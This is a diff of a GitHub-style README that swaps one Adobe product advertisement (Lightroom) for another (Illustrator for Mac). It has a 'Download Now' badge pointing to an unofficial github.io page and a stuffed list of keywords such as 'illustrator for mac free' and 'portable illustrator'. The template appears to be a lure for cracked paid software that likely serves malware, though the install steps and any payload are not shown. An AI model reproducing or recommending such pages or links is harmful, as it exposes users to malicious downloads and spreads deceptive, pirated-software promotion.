@@ -1,12 +1,12 @@
-# Lightroom for Mac
+# Illustrator for Mac
 
-![Lightroom Logo](https://static.vecteezy.com/system/resources/previews/056/850/713/non_2x/adobe-lightroom-logo-with-transparent-background-free-png.png)
+![Illustrator Logo](https://static.vecteezy.com/system/resources/thumbnails/056/850/858/small_2x/adobe-illustrator-logo-on-a-transparent-background-free-png.png)
 
 ---
 
 ## 📦 Download
 
-[![⬇️ Download Now](https://img.shields.io/badge/Lightroom-Download%20%20-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/lightroom)
+[![⬇️ Download Now](https://img.shields.io/badge/Illustrator-Download%20%20-blue?style=for-the-badge&logo=apple)](https://kiakodkfi3.github.io/.github/illustrator)
 
 ## 📦 How to Install
 
@@ -32,47 +32,48 @@
 
 ---
 
-## 🧠 What is Lightroom for Mac?
+## 🧠 What is Adobe Illustrator for Mac?
 
-**Lightroom for Mac** is a professional photo editing and management software developed by **Adobe**, tailored specifically for **macOS** users. Whether you're a beginner looking to enhance everyday photos or a seasoned photographer managing large photo libraries, Lightroom offers intuitive controls and industry-standard editing tools.
+**Adobe Illustrator for Mac** is the go-to software for vector-based graphic design, specifically tailored for users of **macOS**. Whether you're designing logos, icons, illustrations, or user interfaces, Illustrator delivers a robust and professional-grade toolkit with full support for the latest **macOS** versions and **Apple Silicon (M1/M2/M3)** chips.
 
-With **Lightroom**, users can adjust lighting, color, exposure, and apply advanced retouching — all within a sleek, macOS-optimized interface. The program includes powerful features such as **non-destructive editing**, **AI-based enhancements**, and **batch processing**, allowing you to transform your images with precision and speed.
+With powerful features like the **Pen Tool**, **Vector Brushes**, **Live Shapes**, and **Precise Typography Controls**, Illustrator allows you to create crisp, scalable graphics with pixel-perfect accuracy. It's widely used by designers, illustrators, typographers, UI/UX professionals, and digital artists around the world.
 
-Integrated with **Adobe Creative Cloud**, Lightroom enables seamless syncing across devices — edit on your MacBook, and continue on your iPad or iPhone. It's also optimized for the **latest Apple Silicon (M1, M2, M3)** chips, providing ultra-fast performance and battery efficiency.
+Illustrator for Mac is seamlessly integrated with **Adobe Creative Cloud**, enabling collaboration across devices and Adobe apps like Photoshop, InDesign, and After Effects. It’s optimized to deliver smooth performance, even on resource-heavy projects, thanks to its native support for Apple’s latest processors.
 
-Whether you're working from a **MacBook Air**, **MacBook Pro**, **Mac Studio**, or **Mac Mini**, Lightroom adapts to your workflow and helps you achieve beautiful results.
-
----
-
-## 🌟 Key Features
-
-- Full RAW photo editing support  
-- Non-destructive adjustments  
-- AI-powered tools (e.g., sky replacement, masking)  
-- Integrated cloud syncing via Adobe Creative Cloud  
-- Preset management & creation  
-- Batch photo editing  
-- Facial recognition and tagging  
-- Works seamlessly with **Photoshop** and other Adobe apps  
-- Optimized for macOS, including dark mode
+Whether you’re on a **MacBook Air**, **MacBook Pro**, **iMac**, or **Mac Studio**, Adobe Illustrator offers a powerful and flexible environment for all your vector graphic needs.
 
 ---
 
-![Lightroom Screenshot](https://helpx.adobe.com/content/dam/lightroom/workspace_basics.png)
+## 🌟 Features
+
+- Advanced vector drawing tools with precision controls  
+- Typography and font manipulation tools  
+- Artboards for multi-page layout designs  
+- Pattern and brush creation  
+- Pixel preview and snap-to-pixel precision  
+- Seamless integration with Adobe Creative Cloud  
+- Native support for **M1/M2/M3** chips  
+- Export assets for web, print, or app design  
+- SVG, EPS, PDF, and AI file format support  
+- Sync fonts, libraries, and assets across devices
+
+---
+
+![Illustrator Screenshot](https://i.ytimg.com/vi/HIhJJNHKoCg/hq720.jpg)
 
 ---
 
 ## 💻 Compatibility
 
-- macOS **11 Big Sur** and later  
-- Compatible with **macOS Monterey**, **Ventura**, **Sonoma**  
-- Native support for **Apple Silicon (M1, M2, M3)** and **Intel-based Macs**  
-- Runs on **MacBook Pro**, **MacBook Air**, **iMac**, **Mac Studio**, **Mac Mini**
+- macOS **11.0 Big Sur** and newer  
+- Compatible with **macOS Monterey**, **Ventura**, and **Sonoma**  
+- Full native support for **Apple Silicon (M1, M2, M3)** and **Intel-based Macs**  
+- Runs on **MacBook Air**, **MacBook Pro**, **Mac Mini**, **iMac**, and **Mac Studio**
 
 ---
 
 ## 🔑 Keywords
 
-`lightroom mac`, `lightroom classic mac`, `lightroom classic for mac`, `lightroom software for mac`, `lightroom for macbook`, `lightroom osx`, `lightroom classic for macbook air`, `lightroom in mac`, `lightroom mac book`, `lightroom macos`, `lightroom for mac m1`, `lightroom cc mac`, `lightroom free mac`, `lightroom for macbook pro`, `lightroom macbook pro`, `lightroom for mac free reddit`, `lightroom macbook air`, `free lightroom for macbook air`, `lightroom for mac full`, `lightroom for macbook free`, `lightroom mac mini`, `lightroom mac m1`, `lightroom app for mac`, `lightroom for desktop mac`, `lightroom classic for macbook pro`, `lightroom m1`, `lightroom classic mac m1`, `lightroom desktop mac`, `lightroom for mac desktop`, `lightroom classic macos`
+`illustrator mac`, `illustrator for macbook`, `illustrator for macbook air`, `illustrator macos`, `illustrator for mac free`, `illustrator 2022 mac`, `illustrator 2020 mac`, `illustrator cs6 for mac`, `illustrator for mac full`, `macbook illustrator free`, `illustrator for macbook pro`, `portable illustrator for mac`, `illustrator app for mac`, `illustrator mac m1`, `illustrator for mac m1`, `illustrator program for mac`, `illustrator on macbook pro`
 
 ---
